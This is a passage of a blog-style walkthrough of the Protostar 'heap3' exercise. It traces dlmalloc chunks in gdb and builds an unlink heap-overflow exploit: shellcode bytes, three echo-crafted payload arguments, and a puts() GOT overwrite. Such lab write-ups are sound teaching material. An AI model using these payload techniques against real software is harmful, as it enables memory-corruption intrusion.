</span><span class='line'><span class="mi">3583</span>  <span class="n">in</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
</span></code></pre></td></tr></table></div></figure>


<p>We see the 12 <code>B</code>&rsquo;s and <code>C</code>&rsquo;s being written to their respective chunks. We are now at the first
<code>free()</code>. Continue again.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x00000000</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000f89</span>
</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">3</span><span class="p">,</span> <span class="n">free</span> <span class="p">(</span><span class="n">mem</span><span class="o">=</span><span class="mh">0x804c030</span><span class="p">)</span> <span class="n">at</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3583</span>
</span><span class='line'><span class="mi">3583</span>  <span class="n">in</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
</span></code></pre></td></tr></table></div></figure>


<p>The first word of the third chunk&rsquo;s data at <code>0x804c058</code> has been zeroed out. Continue.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x0804c050</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x00000000</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000f89</span>
</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">3</span><span class="p">,</span> <span class="n">free</span> <span class="p">(</span><span class="n">mem</span><span class="o">=</span><span class="mh">0x804c008</span><span class="p">)</span> <span class="n">at</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3583</span>
</span><span class='line'><span class="mi">3583</span>  <span class="n">in</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>0x804c030</code> now has <code>0x0804c050</code> which is a pointer to the start of the third chunk. This shows the
second and third chunk are now tied together in a singly-linked list since they are small enough to
be considered fastbins. Continue.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x0804c028</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804c010</span><span class="o">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x0804c050</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x00000000</span>  <span class="mh">0x43434343</span>
</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000f89</span>
</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">4</span><span class="p">,</span> <span class="mh">0x08048790</span> <span class="n">in</span> <span class="n">puts</span><span class="err">@</span><span class="n">plt</span> <span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now the first chunk has been freed and address <code>0x804c008</code> has a pointer <code>0x0804c028</code> to the second
chunk. If we continue, the program runs the <code>printf("dynamite failed?\n");</code> line.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
</span><span class='line'><span class="n">dynamite</span> <span class="n">failed</span><span class="o">?</span>
</span><span class='line'>
</span><span class='line'><span class="n">Program</span> <span class="n">exited</span> <span class="n">with</span> <span class="n">code</span> <span class="mf">021.</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="n">Error</span> <span class="k">while</span> <span class="n">running</span> <span class="nl">hook_stop</span><span class="p">:</span>
</span><span class='line'><span class="n">Cannot</span> <span class="n">access</span> <span class="n">memory</span> <span class="n">at</span> <span class="n">address</span> <span class="mh">0x804c000</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Crafting the exploit</h2>

<p>Let&rsquo;s work backwards. We can use <code>unlink()</code> to write the four byte address of a call to <code>winner()</code> to the GOT
entry for <code>puts()</code>. Use <code>objdump</code> to find the address of <code>winner()</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">user</span><span class="err">@</span><span class="nl">protostar</span><span class="p">:</span><span class="err">$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">t</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">winner</span>
</span><span class='line'><span class="mi">08048864</span> <span class="n">g</span>     <span class="n">F</span> <span class="p">.</span><span class="n">text</span>    <span class="mo">00000025</span>              <span class="n">winner</span>
</span></code></pre></td></tr></table></div></figure>


<p>We can&rsquo;t just put <code>0x08048864</code> in the GOT entry at <code>0x804b128</code> (why?).
In order to call <code>winner()</code>, we&rsquo;ll need to craft a payload that does so. Such a
payload is often called &ldquo;<a href="https://en.wikipedia.org/wiki/Shellcode">shellcode</a>.&rdquo; The following assembly code will do.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x8048864</span>
</span><span class='line'><span class="n">call</span> <span class="n">eax</span>
</span></code></pre></td></tr></table></div></figure>


<p>Using an <a href="https://defuse.ca/online-x86-assembler.htm#disassembly">online x86 assembler</a>, the above in raw assembly is
<code>\xB8\x64\x88\x04\x08\xFF\xD0</code>. We can store this in the heap&rsquo;s first chunk whose data area starts
at <code>0x804c008</code>. Now we want to write <code>0x804c008</code> into the GOT entry for <code>puts()</code> at <code>0x804b128</code>.
Let&rsquo;s go back to the unlink statements.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">BK</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">P</span> <span class="o">+</span> <span class="mi">12</span><span class="p">);</span>
</span><span class='line'><span class="n">FD</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">P</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
</span><span class='line'><span class="o">*</span><span class="p">(</span><span class="n">FD</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="o">=</span> <span class="n">BK</span><span class="p">;</span>
</span><span class='line'><span class="o">*</span><span class="p">(</span><span class="n">BK</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>BK</code> is the address of <code>\xB8\x64\x88\x04\x08\xFF\xD0</code>. Where should we store that? Let&rsquo;s put it in
the first chunk at <code>0x804c014</code>. The first chunk&rsquo;s data starts at <code>0x804c008</code>, but we&rsquo;ve seen the
first byte is changed by dlmalloc when it&rsquo;s freed. We don&rsquo;t want our shellcode to be changed so we
put it at a safe distance in the data at a +12-byte offset. 12 <code>A</code>&rsquo;s can pad the shellcode enough to
push it 12-bytes into the heap. We have enough info to construct the first command line argument.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">user</span><span class="err">@</span><span class="nl">protostar</span><span class="p">:</span><span class="err">$</span> <span class="n">echo</span> <span class="o">-</span><span class="n">en</span> <span class="s">&quot;AAAAAAAAAAAA</span><span class="se">\xB8\x64\x88\x04\x08\xFF\xD0</span><span class="s">&quot;</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">A</span>
</span></code></pre></td></tr></table></div></figure>


<p>We&rsquo;ll store <code>FD</code> and <code>BK</code> in the third chunk. We can use the second command line argument to
overwrite the size of the third chunk to be greater than 80 to trigger the <code>unlink()</code> macro when the
third chunk is <code>free()</code>&rsquo;d. The second argument needs to have enough characters to overflow its
chunk. The chunk&rsquo;s data starts at <code>0x804c030</code> and ends 32 bytes later at <code>0x804c050</code>. The third
chunk&rsquo;s <code>size</code> is four bytes later at <code>0x804c054</code>. So we can use 32 + 4 = 36 characters as padding.
Let&rsquo;s pick 100 as the size of the third chunk. 100 = 0x64. We also have to set the last bit to 1 to
indicate the second or previous chunk is in use. So the third chunk&rsquo;s size should be <code>0x65</code>. So our
second argument can have 36 <code>B</code>&rsquo;s as padding followed by <code>\x65</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">user</span><span class="err">@</span><span class="nl">protostar</span><span class="p">:</span><span class="err">$</span> <span class="n">echo</span> <span class="o">-</span><span class="n">en</span> <span class="s">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB</span><span class="se">\x65</span><span class="s">&quot;</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">B</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now we craft the third and final argument. The structure for it will be some padding + some four
bytes to be determined + some size + <code>FD</code> + <code>BK</code>.</p>

<p>The third chunk starts at <code>0x804c050</code>. It used to end 40 bytes later at <code>0x804c078</code>, but we
overwrote its size to <code>0x65</code> or 100. So now it ends 100 bytes later at <code>0x804c0b4</code>. We want to
trigger <code>unlink()</code> on the third chunk when we <code>free()</code> it. We&rsquo;ve already ensured it&rsquo;s not a fastbin
by setting its size to be greater than 80 bytes. The next condition is to make dlmalloc consolidate
this chunk with either the chunk before or after. Since we&rsquo;re using the previous chunk, let&rsquo;s fool
dlmalloc into thinking the next chunk is free.</p>

<p>I know what you&rsquo;re thinking. There&rsquo;s no fourth chunk. That&rsquo;s right, but we&rsquo;ll make dlmalloc think
there is. In order to check a chunk is free, dlmalloc looks at the <code>PREV_INUSE</code> bit of the next
chunk. To find the next chunk, dlmalloc adds the size of the current chunk to the current chunk&rsquo;s
address. You can see this at <a href="https://gist.github.com/davidxia/a00062a8e2494f6cc3068a4ba147c98e#file-malloc-2-6-4-c-L3259">line 3259</a>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">inuse_bit_at_offset</span><span class="p">(</span><span class="n">next</span><span class="p">,</span> <span class="n">nextsz</span><span class="p">)))</span>   <span class="cm">/* consolidate forward */</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>inuse_bit_at_offset()</code> is a macro defined at <a href="https://gist.github.com/davidxia/a00062a8e2494f6cc3068a4ba147c98e#file-malloc-2-6-4-c-L1410-L1411">line 1410</a>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define inuse_bit_at_offset(p, s) \</span>
</span><span class='line'><span class="cp">  (chunk_at_offset((p), (s))-&gt;size &amp; PREV_INUSE)</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>chunk_at_offset()</code> is defined at <a href="https://gist.github.com/davidxia/a00062a8e2494f6cc3068a4ba147c98e#file-malloc-2-6-4-c-L1381">line 1381</a>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define chunk_at_offset(p, s)  BOUNDED_1((mchunkptr)(((char*)(p)) + (s)))</span>
</span></code></pre></td></tr></table></div></figure>


<p>So let&rsquo;s write a small size at <code>0x804c0b8</code> to make dlmalloc think the fifth chunk is close by and so
we don&rsquo;t have to add too much padding to our third argument. A size like <code>0x20</code>. We&rsquo;ll have to write
it as <code>\x00\x00\x00\x20</code>. But we have a problem here. C treats <code>\x00</code> as the end of a string, and
thus <code>strcpy()</code> will stop copying any string up to and including that <code>NUL</code>. We won&rsquo;t be able to add
any more bytes after that. This means we cannot insert <code>\x00</code> in the middle of any of our inputs.</p>

<p>But all is not lost. We want a small number for the fourth chunk&rsquo;s size. What&rsquo;s another way of
summing to a small number, at least in the way computers represent integers? In non-modular
arithmetic, the only way two integers can produce a small sum is if they themselves are smaller. In
modular arithmetic, a small integer can be the sum of large numbers that are greater than the
modulus.</p>

<p>Take a closer look at how <code>chunk_at_offset()</code> is defined. It sums two numbers with no sanity checks.
So we can write a really big number with no null bytes that <code>strcpy()</code> won&rsquo;t stop on and will make
dlmalloc think the next fifth chunk is close by. Even better, we can use the first byte of the
fourth chunk as the fifth chunk&rsquo;s size. How can we make dlmalloc think the fifth chunk is four bytes
ahead of the fourth chunk? We do this with <code>0xfffffffc</code> which is -2 in two&rsquo;s complement for signed
integers. So <code>0xfffffffc</code> at <code>0x804c0b8</code> will point to a fifth chunk&rsquo;s size four bytes earlier at
<code>0x804c0b4</code>. This word&rsquo;s last bit must be set to 0 to indicate the fourth chunk is free. We can
simply use <code>0xfffffffc</code> again here.</p>

<p>We want <code>(FD + 12)</code> to equal <code>0x804b128</code>. So FD should be <code>0x804b128</code> - 12 = <code>0x804b11c</code>. In the above
we decided to make <code>BK</code> <code>0x0804c014</code>. We have</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">user</span><span class="err">@</span><span class="nl">protostar</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">echo</span> <span class="o">-</span><span class="n">en</span> <span class="s">&quot;CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</span><span class="se">\xfc\xff\xff\xff\xfc\xff\xff\xff\x1c\xb1\x04\x08\x14\xc0\x04\x08</span><span class="s">&quot;</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">C</span>
</span></code></pre></td></tr></table></div></figure>


<p>92 <code>C</code>&rsquo;s of padding, two <code>0xfffffffc</code> words, <code>FD</code>, followed by <code>BK</code>.</p>

<h2>Checking it works</h2>

<p>With the same gdb session as above, run the program with the three arguments.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">A</span><span class="p">)</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">B</span><span class="p">)</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">C</span><span class="p">)</span>
</span><span class='line'><span class="n">The</span> <span class="n">program</span> <span class="n">being</span> <span class="n">debugged</span> <span class="n">has</span> <span class="n">been</span> <span class="n">started</span> <span class="n">already</span><span class="p">.</span>
</span><span class='line'><span class="n">Start</span> <span class="n">it</span> <span class="n">from</span> <span class="n">the</span> <span class="n">beginning</span><span class="o">?</span> <span class="p">(</span><span class="n">y</span> <span class="n">or</span> <span class="n">n</span><span class="p">)</span> <span class="n">y</span>
</span><span class='line'><span class="n">Starting</span> <span class="nl">program</span><span class="p">:</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">A</span><span class="p">)</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">B</span><span class="p">)</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">C</span><span class="p">)</span>
</span><span class='line'><span class="mh">0x804c000</span><span class="o">:</span> <span class="n">Error</span> <span class="k">while</span> <span class="n">running</span> <span class="nl">hook_stop</span><span class="p">:</span>
</span><span class='line'><span class="n">Cannot</span> <span class="n">access</span> <span class="n">memory</span> <span class="n">at</span> <span class="n">address</span> <span class="mh">0x804c000</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="n">malloc</span> <span class="p">(</span><span class="n">bytes</span><span class="o">=</span><span class="mi">32</span><span class="p">)</span> <span class="n">at</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3211</span>
</span><span class='line'><span class="mi">3211</span>  <span class="n">in</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s continue until we stop at the first <code>free()</code> call.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="p">.</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">3</span><span class="p">,</span> <span class="n">free</span> <span class="p">(</span><span class="n">mem</span><span class="o">=</span><span class="mh">0x804c058</span><span class="p">)</span> <span class="n">at</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">3583</span>
</span><span class='line'><span class="mi">3583</span>  <span class="n">in</span> <span class="n">common</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
</span></code></pre></td></tr></table></div></figure>


<p>Examine the GOT entry for <code>puts()</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span> <span class="mh">0x804b128</span>
</span><span class='line'><span class="mh">0x804b128</span> <span class="o">&lt;</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;:</span>   <span class="mh">0x08048796</span>
